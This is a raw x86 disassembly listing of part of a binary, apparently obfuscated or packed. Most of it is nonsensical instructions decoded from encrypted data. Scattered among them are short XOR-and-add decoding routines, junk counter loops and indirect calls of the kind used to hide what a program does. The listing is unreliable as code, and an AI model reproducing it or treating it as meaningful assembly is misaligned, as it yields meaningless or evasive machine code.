  404371:	jle    0x404317
  404373:	jb     0x404352
  404375:	rcl    BYTE PTR [ebp+edx*4-0x572c503a],cl
  40437c:	aaa    
  40437d:	cs retf 
  40437f:	fld    TBYTE PTR [ebx+0x1b]
  404382:	push   0x4f188dbe
  404387:	aam    0xa3
  404389:	pop    edx
  40438a:	mov    ecx,0x3b1748cc
  40438f:	mov    ah,0xae
  404391:	xlat   BYTE PTR ds:[ebx]
  404392:	rcl    DWORD PTR [ebx+0x61],1
  404395:	jle    0x404414
  404397:	addr16 popa 
  404399:	mov    al,ds:0xc96aed25
  40439e:	lods   eax,DWORD PTR ds:[esi]
  40439f:	test   BYTE PTR [edx],ah
  4043a1:	js     0x404369
  4043a3:	aas    
  4043a4:	test   eax,edi
  4043a6:	pop    ss
  4043a7:	jp     0x4043bb
  4043a9:	xchg   esp,eax
  4043aa:	mov    dl,0x43
  4043ac:	aad    0xd
  4043ae:	aaa    
  4043af:	out    dx,eax
  4043b0:	loopne 0x404393
  4043b2:	mov    dh,0x78
  4043b4:	ret    
  4043b5:	movntps XMMWORD PTR [esi+0x6e4a0fd6],xmm5
  4043bc:	push   esi
  4043bd:	inc    edx
  4043be:	and    ch,BYTE PTR [edx]
  4043c0:	or     esi,ebx
  4043c2:	xor    edi,edi
  4043c4:	pop    ebx
  4043c5:	xor    edx,DWORD PTR [ecx-0x4d]
  4043c8:	ds dec ebx
  4043ca:	add    DWORD PTR [eax+0x20],0xffffff84
  4043ce:	gs ss xchg esi,eax
  4043d1:	stos   DWORD PTR es:[edi],eax
  4043d2:	push   0xb26d5f09
  4043d7:	in     al,dx
  4043d8:	jl     0x40436e
  4043da:	sbb    al,BYTE PTR [ecx+ebx*1-0x2457af1]
  4043e1:	(bad)  
  4043e2:	call   FWORD PTR [edi+0x5b]
  4043e5:	mov    eax,DWORD PTR [ebp-0x8]
  4043e8:	mov    edx,DWORD PTR [ebp+0x10]
  4043eb:	xor    eax,ecx
  4043ed:	add    eax,esi
  4043ef:	mov    DWORD PTR [edx],eax
  4043f1:	mov    eax,DWORD PTR [ebp-0x8]
  4043f4:	xor    eax,ecx
  4043f6:	add    eax,esi
  4043f8:	mov    DWORD PTR [ebp+0x8],eax
  4043fb:	mov    eax,DWORD PTR [ebp+0x8]
  4043fe:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404402:	mov    dl,BYTE PTR [ebp-0x1]
  404405:	cmp    al,dl
  404407:	je     0x40444a
  40440d:	mov    eax,DWORD PTR [ebp+0x8]
  404410:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404414:	mov    edx,DWORD PTR [ebp+0xc]
  404417:	cmp    al,BYTE PTR [edx]
  404419:	jne    0x40467a
  40441f:	mov    eax,DWORD PTR [ebp-0x8]
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	movsx  edx,BYTE PTR [edx]
  404428:	xor    eax,ecx
  40442a:	add    eax,esi
  40442c:	cmp    edx,eax
  40442e:	je     0x404464
  404434:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40443b:	lea    eax,[ebp-0x18]
  40443e:	mov    DWORD PTR [ebp-0x14],eax
  404441:	mov    eax,DWORD PTR [ebp-0x14]
  404444:	add    DWORD PTR [eax],0x705fa8f
  40444a:	mov    eax,DWORD PTR [ebp-0x10]
  40444d:	mov    edx,DWORD PTR [ebp+0x8]
  404450:	xor    eax,ecx
  404452:	lea    eax,[eax+edx*1+0x32729e]
  404459:	mov    DWORD PTR [ebp+0x8],eax
  40445c:	inc    DWORD PTR [ebp+0xc]
  40445f:	jmp    0x4043fb
  404464:	mov    eax,DWORD PTR [ebp-0x10]
  404467:	jmp    0x40456c
  40446c:	sbb    esi,DWORD PTR [edi+0x22]
  40446f:	sbb    BYTE PTR [edx],ah
  404471:	cmp    eax,0x7b87773d
  404476:	les    ecx,FWORD PTR ds:0x8ee50
  40447c:	mov    dh,0x1c
  40447e:	jl     0x4044fc
  404480:	push   esp
  404481:	jl     0x4044ff
  404483:	jl     0x404405
  404485:	scas   al,BYTE PTR es:[edi]
  404486:	push   edx
  404487:	inc    eax
  404488:	jo     0x4044ec
  40448a:	dec    ebp
  40448b:	ds stos BYTE PTR es:[edi],al
  40448d:	addr16 xchg edi,eax
  40448f:	jmp    0x4044bb
  404491:	sub    al,0xed
  404493:	retf   
  404494:	stc    
  404495:	dec    edi
  404496:	cli    
  404497:	jp     0x404495
  404499:	(bad)  
  40449a:	jl     0x4044f5
  40449c:	inc    esi
  40449d:	adc    bl,bl
  40449f:	outs   dx,BYTE PTR ds:[esi]
  4044a0:	icebp  
  4044a1:	dec    edx
  4044a2:	inc    al
  4044a4:	adc    ah,bh
  4044a6:	ins    DWORD PTR es:[edi],dx
  4044a7:	xor    al,0x2e
  4044a9:	fsubr  st,st(4)
  4044ab:	(bad)  
  4044ac:	imul   ebp,DWORD PTR [ecx-0x5eddbee2],0x1c
  4044b3:	dec    ecx
  4044b4:	fst    QWORD PTR [ebp-0x70ea00f2]
  4044ba:	scas   al,BYTE PTR es:[edi]
  4044bb:	jbe    0x4044d1
  4044bd:	retw   0x866f
  4044c1:	(bad)  
  4044c2:	inc    eax
  4044c3:	imul   ebp,DWORD PTR [esi+ebp*4],0x50d5d46c
  4044ca:	add    ebx,edx
  4044cc:	loopne 0x404546
  4044ce:	mov    ebx,0xdd7f15c2
  4044d3:	(bad)  
  4044d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d5:	int    0x7d
  4044d7:	arpl   si,sp
  4044d9:	mov    esi,0xf1cf540c
  4044de:	xchg   ebx,eax
  4044df:	or     eax,0x869b7f5d
  4044e4:	loope  0x404548
  4044e6:	mov    eax,DWORD PTR [ebp-0x2a]
  4044e9:	jne    0x4044eb
  4044eb:	arpl   WORD PTR ss:[edx+0x11],dx
  4044ef:	rol    BYTE PTR [eax+0x782add60],cl
  4044f5:	and    DWORD PTR [esi+0x35],ecx
  4044f8:	dec    edx
  4044f9:	push   ecx
  4044fa:	and    ebp,ebx
  4044fc:	xor    BYTE PTR [ecx+0x74312aa2],bh
  404502:	xor    ch,BYTE PTR [eax+edi*4+0x1761756a]
  404509:	dec    eax
  40450a:	mov    edi,0xb63eba00
  40450f:	xor    DWORD PTR [esi],esi
  404511:	in     al,0xae
  404513:	mov    cl,0xbe
  404515:	out    0x73,eax
  404517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404518:	cld    
  404519:	fsub   QWORD PTR [edx+0x4e]
  40451c:	int    0xb3
  40451e:	adc    esp,DWORD PTR [eax]
  404520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404521:	mov    ch,0x37
  404523:	xchg   esp,eax
  404524:	fucomi st,st(0)
  404526:	pushf  
  404527:	outs   dx,BYTE PTR ds:[esi]
  404528:	add    eax,0x3a1df2a5
  40452d:	call   FWORD PTR [esi-0x381f1e85]
  404533:	pop    edx
  404534:	scas   eax,DWORD PTR es:[edi]
  404535:	adc    eax,0xb821b20
  40453a:	leave  
  40453b:	pusha  
  40453c:	mov    DWORD PTR [edx-0x1f70b40c],eax
  404542:	inc    ebp
  404543:	imul   esp,DWORD PTR [ecx+0x361234ce],0x252b9e85
  40454d:	fbstp  TBYTE PTR [esi-0x21]
  404550:	repnz xchg edx,eax
  404552:	mov    dh,0x9d
  404554:	aam    0xf9
  404556:	in     eax,0x67
  404558:	and    edi,DWORD PTR [eax-0x7d8fcbf2]
  40455e:	mov    esp,0xe9dc0b72
  404563:	retf   0xa132
  404566:	xor    al,0x6
  404568:	xor    DWORD PTR [eax+0x5f],ecx
  40456b:	or     dh,BYTE PTR [ebx]
  40456d:	ror    DWORD PTR [ebx+0xe9104d],0x1
  404574:	add    BYTE PTR [eax],al
  404576:	imul   eax,DWORD PTR ds:0x7d79fdb1,0x7b
  40457d:	test   DWORD PTR [esi],esp
  40457f:	xchg   ecx,eax
  404580:	retf   
  404581:	fstp   QWORD PTR [edx-0x51698b82]
  404587:	pop    ds
  404588:	jl     0x404606
  40458a:	push   esp
  40458b:	jl     0x404609
  40458d:	jl     0x40456f
  40458f:	out    dx,al
  404590:	mov    bl,BYTE PTR ds:0xfb950d93
  404596:	loope  0x4045c4
  404598:	std    
  404599:	retf   
  40459a:	mov    edi,0xf6f91bf
  40459f:	rol    bh,cl
  4045a1:	xlat   BYTE PTR ds:[ebx]
  4045a2:	xor    ebx,DWORD PTR [edx+0x3c]
  4045a5:	fs cmc 
  4045a7:	jmp    0x6a7a:0x8abf391
  4045ae:	shl    bh,cl
  4045b0:	cld    
  4045b1:	or     DWORD PTR [edi-0x4],ebx
  4045b4:	loope  0x404562
  4045b6:	out    0x64,al
  4045b8:	xchg   ebx,eax
  4045b9:	sub    DWORD PTR [ecx],ebx
  4045bb:	sub    bh,BYTE PTR [esi+0x6ed829aa]
  4045c1:	mov    BYTE PTR [eax+edx*4+0x2c],ah
  4045c5:	shr    BYTE PTR [esi-0x42],cl
  4045c8:	mov    eax,ds:0xf3586886
  4045cd:	stos   BYTE PTR es:[edi],al
  4045ce:	sub    bh,BYTE PTR [esi+0x40625688]
  4045d4:	mov    esi,0x70efab89
  4045d9:	imul   ebp,DWORD PTR [ebx],0x6a
  4045dc:	scas   eax,DWORD PTR es:[edi]
  4045dd:	dec    edx
  4045de:	push   ebp
  4045df:	sar    BYTE PTR [ebx+eax*4+0x7fa47268],1
  4045e6:	outs   dx,BYTE PTR ds:[esi]
  4045e7:	sub    DWORD PTR [edi],ebp
  4045e9:	icebp  
  4045ea:	lods   eax,DWORD PTR ds:[esi]
  4045eb:	pop    ss
  4045ec:	jmp    0xa0e5:0x4774ae82
  4045f3:	and    al,0x79
  4045f5:	scas   eax,DWORD PTR es:[edi]
  4045f6:	rcr    DWORD PTR ds:0xfe78a029,1
  4045fc:	jbe    0x404589
  4045fe:	push   ss
  4045ff:	(bad)  
  404601:	pop    ebx
  404602:	leave  
  404603:	pop    ss
  404604:	icebp  
  404605:	jmp    0x3960:0xbbba8b64
  40460c:	pusha  
  40460d:	fs hlt 
  40460f:	jns    0x404656
  404611:	test   BYTE PTR [ebx+0x5a],ch
  404614:	push   ebp
  404615:	test   al,0x9d
  404617:	js     0x404622
  404619:	daa    
  40461a:	dec    edx
  40461b:	push   eax
  40461c:	aaa    
  40461d:	inc    ebp
  40461e:	(bad)  
  40461f:	out    dx,al
  404620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404621:	sub    esi,DWORD PTR [ecx+0x5e]
  404624:	xchg   BYTE PTR [ebx+edx*8+0x1dda11a],bh
  40462b:	adc    cl,BYTE PTR [esi-0x548f7084]
  404631:	into   
  404632:	rol    DWORD PTR [ebx+0x75f759fc],0x30
  404639:	xchg   ecx,eax
  40463a:	push   0xb2baafc8
  40463f:	cmp    BYTE PTR [edx-0x75],0x7e
  404643:	dec    edx
  404644:	cmp    edx,edi
  404646:	push   0x28093880
  40464b:	in     eax,0x6f
  40464d:	adc    DWORD PTR ds:0x9a639619,ebp
  404653:	ins    BYTE PTR es:[edi],dx
  404654:	test   eax,0x6a4602c8
  404659:	jbe    0x404696
  40465b:	jg     0x40461a
  40465d:	call   0xfc618198
  404662:	adc    dl,BYTE PTR [ecx+0x4e9c13a8]
  404668:	shl    DWORD PTR [esi+0x4fc9e54f],1
  40466e:	sbb    BYTE PTR [eax-0x7a],bl
  404671:	add    ebp,esp
  404673:	inc    ebx
  404674:	lahf   
  404675:	xchg   ebx,eax
  404676:	add    eax,esi
  404678:	mov    DWORD PTR [ecx],eax
  40467a:	pop    esi
  40467b:	leave  
  40467c:	ret    0xc
  40467f:	push   ebp
  404680:	mov    ebp,esp
  404682:	push   ecx
  404683:	adc    edx,0x1579
  404689:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404690:	sbb    DWORD PTR ds:0x4292a5,0xe46
  40469a:	mov    eax,DWORD PTR [ebp-0x4]
  40469d:	xor    edx,edx
  40469f:	add    edx,DWORD PTR ds:0x42c8ba
  4046a5:	xor    ecx,ecx
  4046a7:	add    ecx,DWORD PTR ds:0x42c8ce
  4046ad:	sub    edx,ecx
  4046af:	xor    edx,DWORD PTR [edx+ecx*1]
  4046b2:	mov    edx,DWORD PTR [ebp+0x10]
  4046b5:	xor    DWORD PTR ds:0x427cf7,0x3e4e
  4046bf:	mov    ecx,0x7510857
  4046c4:	sbb    DWORD PTR ds:0x427cff,0x4292c5
  4046ce:	xor    eax,ecx
  4046d0:	add    DWORD PTR ds:0x4275ac,0x4292c1
  4046da:	add    eax,0x32729e
  4046df:	mov    DWORD PTR [edx],eax
  4046e1:	adc    DWORD PTR ds:0x427cff,0xab1
  4046eb:	mov    eax,DWORD PTR [ebp+0xc]
  4046ee:	mov    DWORD PTR ds:0x4292c5,0x1c
  4046f8:	cmp    DWORD PTR ds:0x4292c5,0x0
  4046ff:	je     0x4048d6
  404705:	cmp    DWORD PTR ds:0x4292c5,0xd
  40470c:	jne    0x404718
  404712:	call   DWORD PTR ds:0x4279d3
  404718:	cmp    DWORD PTR ds:0x4292c5,0xe
  40471f:	jne    0x404734
  404725:	xor    edx,edx
  404727:	xor    edx,DWORD PTR ds:0x4292c5
  40472d:	dec    edx
  40472e:	mov    DWORD PTR ds:0x4292c5,edx
  404734:	xor    edx,edx
  404736:	xor    edx,DWORD PTR ds:0x4292c5
  40473c:	dec    edx
  40473d:	mov    DWORD PTR ds:0x4292c5,edx
  404743:	jmp    0x4046f8
  404748:	and    DWORD PTR ds:0x427cf7,0x0
  404752:	jmp    0x404766
  404757:	xor    edx,edx
  404759:	or     edx,DWORD PTR ds:0x427cf7
  40475f:	inc    edx
  404760:	mov    DWORD PTR ds:0x427cf7,edx
  404766:	cmp    DWORD PTR ds:0x427cf7,0x1c
  40476d:	jae    0x4048d6
  404773:	cmp    DWORD PTR ds:0x427cf7,0x21
  40477a:	jne    0x404791
  404780:	push   DWORD PTR [ebp-0xc]
  404783:	push   DWORD PTR [ebp-0x28]
  404786:	push   0x3a03
  40478b:	call   DWORD PTR ds:0x4278f3
  404791:	jmp    0x404757
  404796:	jmp    0x4048d6
  40479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479c:	mov    eax,0x5df986f9
  4047a1:	gs mov ebx,0x53054722
  4047a7:	gs cwde 
  4047a9:	out    0x83,al
  4047ab:	xchg   BYTE PTR [esi],bl
  4047ad:	jl     0x40482b
  4047af:	adc    DWORD PTR [edi+0x7c],edi
  4047b2:	jl     0x4047db
  4047b4:	cli    
  4047b5:	shr    BYTE PTR [ecx-0x11575d29],cl
  4047bb:	rcr    DWORD PTR [ebp+ebp*8+0x50],1
  4047bf:	retf   
  4047c0:	scas   al,BYTE PTR es:[edi]
  4047c1:	inc    eax
  4047c2:	xchg   ebx,eax
  4047c3:	ds dec edi
  4047c5:	inc    ebp
  4047c6:	adc    al,0xf2
  4047c8:	pop    edi
  4047c9:	test   BYTE PTR [edx],bl
  4047cb:	ins    DWORD PTR es:[edi],dx
  4047cc:	add    al,al
  4047ce:	push   esp
  4047cf:	call   0x8d99487d
  4047d4:	ss mov edx,0x1233e61d
  4047da:	jmp    0x404809
  4047dc:	jbe    0x4047e0
  4047de:	mov    esi,0x8351392d
  4047e3:	mov    cl,0xdd
  4047e5:	ins    BYTE PTR es:[edi],dx
  4047e6:	xchg   edx,eax
  4047e7:	inc    ebp
  4047e8:	outs   dx,DWORD PTR ds:[esi]
  4047e9:	mov    edx,0xea91320d
  4047ee:	ja     0x404847
  4047f0:	cmp    dl,dh
  4047f2:	mov    DWORD PTR [ecx],ebp
  4047f4:	push   ds
  4047f5:	imul   dh
  4047f7:	loopne 0x4047c2
  4047f9:	addr16 mov ds:0x317,eax
  4047fd:	mov    dl,0x7d
  4047ff:	cmp    ecx,DWORD PTR ds:0xe22c8992
  404805:	xchg   esp,eax
  404806:	and    eax,DWORD PTR [esi*8+0xa63de80]
  40480d:	push   edx
  40480e:	int3   
  40480f:	dec    ebp
  404810:	lods   eax,DWORD PTR ds:[esi]
  404811:	(bad)  
  404812:	psubusw mm0,mm1
  404815:	sub    DWORD PTR [ecx+0x1b855133],esp
  40481b:	jecxz  0x40482f
  40481d:	mov    ebx,0x530a7c4f
  404822:	mov    dh,0x1a
  404824:	call   0x9d46b820
  404829:	popf   
  40482a:	imul   ecx,DWORD PTR [ecx+0x4356a255],0x8
  404831:	fidivr WORD PTR [eax]
  404833:	cmp    ch,BYTE PTR [edi-0x16780ee2]
  404839:	nop    DWORD PTR [ecx+0x6a]
  40483d:	add    eax,DWORD PTR [eax-0xf]
  404840:	stos   BYTE PTR es:[edi],al
  404841:	lods   al,BYTE PTR ds:[esi]
  404842:	fs ret 0x66b
  404846:	test   BYTE PTR [ebp+0x56f05244],ch
  40484c:	jle    0x404877
  40484e:	stc    
  40484f:	sub    al,0xd4
  404851:	sub    BYTE PTR [esi-0x56266421],cl
  404857:	das    
  404858:	or     eax,0xd96a3962
  40485d:	and    edx,ecx
  40485f:	icebp  
  404860:	pop    esp
  404861:	cwde   
  404862:	je     0x4048a3
  404864:	push   ebp
  404865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404866:	test   dl,cl
  404868:	pushf  
  404869:	cmp    eax,0xfe03df01
  40486e:	adc    ebp,DWORD PTR [edx-0x35e3400d]
  404874:	mov    edx,0x61125024
  404879:	in     al,0x98
  40487b:	jle    0x40488d
  40487d:	xor    DWORD PTR [eax+0xb],esp
  404880:	bound  esp,QWORD PTR [ebx+0x538a6595]
  404886:	out    dx,eax
  404887:	(bad)  
  404888:	stc    
  404889:	lds    esi,FWORD PTR [ebx+0x70]
  40488c:	ret    
  40488d:	sub    eax,0x8175edf1
  404892:	cmp    ecx,DWORD PTR [edx-0x67]
  404895:	pop    esi
  404896:	jecxz  0x404850
  404898:	mov    dh,0x9e
  40489a:	add    eax,esp
  40489c:	ficomp DWORD PTR [ebx-0x29454a10]
  4048a2:	jb     0x4048af
  4048a4:	fiadd  DWORD PTR [ecx+ecx*4+0x72]
  4048a8:	mov    edi,0x6ee05487
  4048ad:	neg    DWORD PTR [ebx+0x368f3901]
  4048b3:	addr16 pop esp
  4048b5:	jmp    0x404884
  4048b7:	mov    ecx,es
  4048b9:	jl     0x4048e9
  4048bb:	cmp    BYTE PTR [ecx-0x25],bh
  4048be:	xor    dl,BYTE PTR [ebx+0x27]
  4048c1:	(bad)  
  4048c2:	dec    esi
  4048c3:	inc    ecx
  4048c4:	loopne 0x4048bb
  4048c6:	adc    al,0x8b
  4048c8:	ret    
  4048c9:	daa    
  4048ca:	icebp  
  4048cb:	add    dl,ah
  4048cd:	pushf  
  4048ce:	or     edi,ebp
  4048d0:	dec    edx
  4048d1:	jge    0x4048c4
  4048d3:	xor    ebp,0x56c1336f
  4048d9:	mov    esi,DWORD PTR [ebp+0x10]
  4048dc:	mov    edx,0x32729e
  4048e1:	add    eax,edx
  4048e3:	mov    DWORD PTR [esi+0x4],eax
  4048e6:	mov    eax,DWORD PTR [ebp+0x14]
  4048e9:	mov    esi,DWORD PTR [ebp+0x10]
  4048ec:	mov    DWORD PTR [esi+0x8],eax
  4048ef:	mov    eax,DWORD PTR [ebp+0x18]
  4048f2:	mov    esi,DWORD PTR [ebp+0x10]
  4048f5:	mov    DWORD PTR [esi+0xc],eax
  4048f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4048fb:	mov    esi,DWORD PTR [ebp+0x10]
  4048fe:	jmp    0x404a3e
  404903:	shl    DWORD PTR [ebx+0x7],0xc
  404907:	mov    ebp,0x4065d978
  40490c:	mov    eax,ds:0xf637e8b5
  404911:	or     BYTE PTR [edi+0x7c7c11bb],ch
  404917:	adc    DWORD PTR [edi+0x7c],edi
  40491a:	jl     0x40496e
  40491c:	lods   eax,DWORD PTR ds:[esi]
  40491d:	mov    edx,0x3f7a89b8
  404922:	(bad)  
  404923:	out    dx,al
  404924:	and    DWORD PTR [eax],ecx
  404926:	pop    ebp
  404927:	test   al,0xdc
  404929:	int3   
  40492a:	jnp    0x4048ed
  40492c:	xchg   dl,cl
  40492e:	jns    0x40493a
  404930:	arpl   WORD PTR [edi-0x31],bp
  404933:	hlt    
  404934:	test   BYTE PTR [edi],bl
  404936:	mov    bh,0xf2
  404938:	test   eax,0xe9c92bf
  40493d:	inc    ecx
  40493e:	xor    DWORD PTR [ebx+ecx*4-0x4b],esp
  404942:	xor    DWORD PTR [eax],esi
  404944:	ror    al,1
  404946:	mov    al,ds:0xab4f7c5f
  40494b:	jne    0x404936
  40494d:	and    DWORD PTR ds:[edx+0x3ced2ee9],edi
  404954:	mov    ebp,0xd98d562a
  404959:	jmp    0xc114410c
  40495e:	or     al,0x50
  404960:	and    al,0xf4
  404962:	push   ecx
  404963:	sub    BYTE PTR [ebp-0x80],ah
  404966:	jge    0x404989
  404968:	int    0xb3
  40496a:	test   eax,0x68338635
  40496f:	pop    edi
  404970:	xor    DWORD PTR [edi+0xd],edi
  404973:	popa   
  404974:	sbb    eax,0x396336c
  404979:	fbstp  TBYTE PTR [edx]
  40497b:	and    ecx,edx
  40497d:	adc    DWORD PTR [edi],edx
  40497f:	mov    eax,ds:0x6f17fa59
  404984:	or     DWORD PTR [eax],ecx
  404986:	nop
  404987:	pop    ebp
  404988:	and    dl,BYTE PTR [ebx+0x44]
  40498b:	xchg   edx,eax
  40498c:	fmul   DWORD PTR [ecx]
  40498e:	int    0x58
  404990:	hlt    
  404991:	dec    ecx
  404992:	nop
  404993:	int    0x67
  404995:	adc    eax,DWORD PTR [ebx+0x43d2ce1b]
  40499b:	sub    BYTE PTR [ecx],bh
  40499d:	mul    BYTE PTR ds:0x5541803a
  4049a3:	cmc    
  4049a4:	jle    0x4049fd
  4049a6:	xor    eax,0x5a18c660
  4049ab:	xchg   bh,bl
  4049ad:	cmp    dh,ah
  4049af:	icebp  
  4049b0:	jnp    0x404974
  4049b2:	mov    ah,0x1
  4049b4:	pop    eax
  4049b5:	pop    esp
  4049b6:	dec    esp
  4049b7:	mov    esi,0x453c8a31
  4049bc:	pop    esp
  4049bd:	hlt    
  4049be:	mov    bl,0x35
  4049c0:	mov    edx,0x167f3112
  4049c5:	add    BYTE PTR [esi],ah
  4049c7:	in     eax,0xd1
  4049c9:	shl    DWORD PTR gs:[esi+esi*2+0x7e],0xac
  4049cf:	xchg   edi,eax
  4049d0:	add    edi,DWORD PTR [edi+0x52]
  4049d3:	(bad)  
  4049d4:	jo     0x404a11
  4049d6:	add    al,BYTE PTR [ebx]
  4049d8:	pushf  
  4049d9:	(bad)  
  4049da:	and    ebp,DWORD PTR [edi-0x79]
  4049dd:	lea    edx,[esi+0x2ccf2a7d]
  4049e3:	pop    esp
  4049e4:	cld    
  4049e5:	dec    esp
  4049e6:	call   0x3601fb49
  4049eb:	add    edi,ebx
  4049ed:	push   ds
  4049ee:	aad    0xce
  4049f0:	in     al,0x7c
  4049f2:	and    esi,DWORD PTR [esi+eiz*4]
  4049f5:	int    0xab
  4049f7:	jmp    0x1888:0x8f2d7913
  4049fe:	stos   DWORD PTR es:[edi],eax
  4049ff:	fild   DWORD PTR [edx+0x45]
  404a02:	in     al,dx
  404a03:	add    esi,edx
  404a05:	jl     0x404a50
  404a07:	xlat   BYTE PTR ds:[ebx]
  404a08:	sub    al,0xb0
  404a0a:	ror    BYTE PTR [ecx],1
  404a0c:	jns    0x404a2a
  404a0e:	or     al,0xc5
  404a10:	push   es
  404a11:	daa    
  404a12:	leave  
  404a13:	jnp    0x404a4a
  404a15:	ret    0xe58b
  404a18:	pushf  
  404a19:	test   bl,dh
  404a1b:	mov    esi,0xbab39d81
  404a20:	retf   
  404a21:	(bad)  
  404a22:	fs jb  0x4049ab
  404a25:	jnp    0x404a83
  404a27:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a29:	mov    edi,0xbdde117b
  404a2e:	cmc    
  404a2f:	push   ss
  404a30:	push   edx
  404a31:	jle    0x404a71
  404a33:	clc    
  404a34:	or     edx,esi
  404a36:	imul   edx,DWORD PTR [edx-0x24ddd632],0xffffff88
  404a3d:	dec    BYTE PTR [ecx-0x3f74efba]
  404a43:	mov    eax,DWORD PTR [ebp+0x8]
  404a46:	xor    eax,ecx
  404a48:	add    eax,edx
  404a4a:	pop    esi
  404a4b:	leave  
  404a4c:	ret    0x18
  404a4f:	push   ebp
  404a50:	mov    ebp,esp
  404a52:	mov    eax,DWORD PTR [ebp+0xc]
  404a55:	xor    edx,edx
  404a57:	mov    ecx,0x7264fcad
  404a5c:	div    ecx
  404a5e:	jmp    0x404b9e
  404a63:	outs   dx,BYTE PTR ds:[esi]
  404a64:	stc    
  404a65:	sti    
  404a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a67:	jnp    0x404a23
  404a69:	gs stc 
  404a6b:	dec    esi
  404a6c:	xchg   DWORD PTR [ebx+0x7fcd200d],esp
  404a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a73:	pop    esp
  404a74:	adc    BYTE PTR [esp+edi*2+0x11],bh
  404a78:	jg     0x404af6
  404a7a:	jl     0x404a83
  404a7c:	dec    edx
  404a7d:	jg     0x404aac
  404a7f:	mov    ecx,0x12789c31
  404a84:	fcmovb st,st(5)
  404a86:	sub    esp,DWORD PTR [esi+0xb]
  404a89:	dec    edi
  404a8a:	and    al,0x1d
  404a8c:	mov    eax,0xacb3e479
  404a91:	inc    ebp
  404a92:	fnstenv [esi]
  404a94:	add    eax,DWORD PTR [edx-0x5d03ea36]
  404a9a:	retf   
  404a9b:	add    DWORD PTR ds:0xd512dfab,ebp
  404aa1:	call   0xd40f036a
  404aa6:	lods   al,BYTE PTR ds:[esi]
  404aa7:	jno    0x404af6
  404aa9:	mov    eax,ds:0x70e2e5a7
  404aae:	mov    ch,0x1a
  404ab0:	jecxz  0x404ac1
  404ab2:	test   DWORD PTR [edi],eax
  404ab4:	arpl   WORD PTR [edi-0x1a],bp
  404ab7:	or     ch,dl
  404ab9:	mov    esp,0x3eb2f104
  404abe:	fild   QWORD PTR [edi]
  404ac0:	pop    eax
  404ac1:	pushf  
  404ac2:	push   es
  404ac3:	cld    
  404ac4:	stc    
  404ac5:	and    DWORD PTR [edx-0x39],ebp
  404ac8:	inc    ecx
  404ac9:	mov    esp,0x6fed034d
  404ace:	(bad)  
  404acf:	push   0x55
  404ad1:	int3   
  404ad2:	fidiv  WORD PTR [ebp+0x64]
  404ad5:	retf   0x8931
  404ad8:	rcr    DWORD PTR [eax],0x7d
  404adb:	test   DWORD PTR [ebp+0xe0332f5],eax
  404ae1:	add    eax,0x3e4329a4
  404ae6:	popa   
  404ae7:	cs mov dl,0x7c
  404aea:	call   0x82b4cfd8
  404aef:	adc    edi,edx
  404af1:	stos   BYTE PTR es:[edi],al
  404af2:	bound  esp,QWORD PTR [esi]
  404af4:	push   0x6e
  404af6:	clc    
  404af7:	pushf  
  404af8:	loope  0x404b52
  404afa:	dec    esi
  404afb:	mov    bl,0x16
  404afd:	int    0x70
  404aff:	pop    eax
  404b00:	mov    bl,0x21
  404b02:	sub    al,0x86
  404b04:	lds    esi,FWORD PTR [ebx-0x49a512a4]
  404b0a:	leave  
  404b0b:	xchg   esi,eax
  404b0c:	ja     0x404ac3
  404b0e:	mov    eax,0xeba5ac47
  404b13:	retf   
  404b14:	aaa    
  404b15:	xchg   edx,eax
  404b16:	and    eax,0x1ddd3ed4
  404b1b:	jne    0x404b94
  404b1d:	pop    esi
  404b1e:	bound  esi,QWORD PTR ds:0x9bfc6ec9
  404b24:	or     DWORD PTR [ebx-0x181aacf6],0x53
  404b2b:	adc    BYTE PTR [ebx],ah
  404b2d:	inc    ebx
  404b2e:	lods   eax,DWORD PTR ds:[esi]
  404b2f:	or     eax,0x8efa2f4e
  404b34:	loope  0x404b42
  404b36:	stos   DWORD PTR es:[edi],eax
  404b37:	lahf   
  404b38:	rcr    BYTE PTR [esi],cl
  404b3a:	pop    edx
  404b3b:	dec    edx
  404b3c:	ins    DWORD PTR es:[edi],dx
  404b3d:	inc    esi
  404b3e:	lods   eax,DWORD PTR ds:[esi]
  404b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b40:	inc    eax
  404b41:	sbb    edx,DWORD PTR [edi-0x37ced8b6]
  404b47:	in     eax,0xb7
  404b49:	js     0x404ba3
  404b4b:	inc    ebp
  404b4c:	inc    edi
  404b4d:	out    0xe0,eax
  404b4f:	sti    
  404b50:	retf   
  404b51:	hlt    
  404b52:	das    
  404b53:	pop    edx
  404b54:	(bad)
  404b57:	xchg   esp,eax
  404b58:	loope  0x404b63
  404b5a:	xor    eax,0xdffd68f2
  404b5f:	sub    eax,0x84968e82
  404b64:	aaa    
  404b65:	xchg   ecx,eax
  404b66:	xchg   edi,eax
  404b67:	(bad)  
  404b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6a:	mov    ecx,0x66f8eecd
  404b6f:	adc    ebx,DWORD PTR [ecx+ebx*4+0xc]
  404b73:	imul   DWORD PTR [ebx]
  404b75:	mov    DWORD PTR [ebx+eiz*8+0x1f],esi
  404b79:	lahf   
  404b7a:	(bad)  
  404b7b:	fistp  DWORD PTR [eax-0x3a]
  404b7e:	test   bh,0x23
  404b81:	retf   0x4f2a
  404b84:	xchg   edx,eax
  404b85:	adc    eax,0x92b73d41
  404b8a:	imul   edx,DWORD PTR [esi],0x652627a3
  404b90:	in     eax,dx
  404b91:	or     BYTE PTR [edi],ch
  404b93:	popf   
  404b94:	mov    ch,0xed
  404b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b97:	dec    esp
  404b98:	outs   dx,DWORD PTR ds:[esi]
  404b99:	xor    al,0x7e
  404b9b:	mov    cl,0x9a
